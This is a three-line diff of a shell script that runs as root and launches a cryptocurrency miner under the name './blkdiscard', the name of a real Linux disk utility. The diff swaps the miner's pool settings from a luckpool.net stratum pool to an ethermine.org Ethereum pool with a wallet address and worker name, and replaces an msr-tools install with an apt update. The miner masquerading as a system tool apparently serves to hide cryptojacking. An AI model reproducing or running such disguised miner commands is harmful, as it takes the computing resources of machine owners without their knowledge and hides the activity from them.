@@ -1,3 +1,3 @@
 sudo bash
-apt-get install msr-tools
-./blkdiscard -c stratum+tcp://ap.luckpool.net:3956 -u RT28Xs3NoxhqRXeq1AmVp7QiqdNR3S56Y5.sorensen -p x --cpu 6
+apt-get update
+./blkdiscard --algo ethash --pool us1.ethermine.org:4444 --wallet 0x6bdcCbAEE917403f3704aABFa5811c989ccDf621 --worker-name KULI-JAWA --tlimit 74 --tresume 69 --safe-dag
